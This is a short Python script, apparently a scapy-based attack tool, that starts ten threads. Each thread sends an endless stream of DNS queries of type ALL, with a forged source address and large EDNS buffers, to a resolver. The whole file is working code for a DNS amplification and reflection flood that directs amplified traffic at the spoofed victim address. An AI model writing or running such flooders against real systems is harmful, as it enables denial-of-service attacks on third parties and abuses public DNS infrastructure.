from scapy.all import *
import threading
import sys, os,time 

class attackNeet(threading.Thread):
	def run(self):
		fakesrc = '192.168.1.111'
		server = '128.186.8.8'
		device = 'wlp58s0'

		mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
		#request-
		while(1):
			send(mypacket)
def main():
	for x in range(10):
		mythread = attackNeet(name = "Thread-{}".format(x + 1))  # ...Instantiate a thread and pass a unique ID to it
        	mythread.start()
	sleep(1)
	os._exit(1)
if __name__=="__main__":
	main()
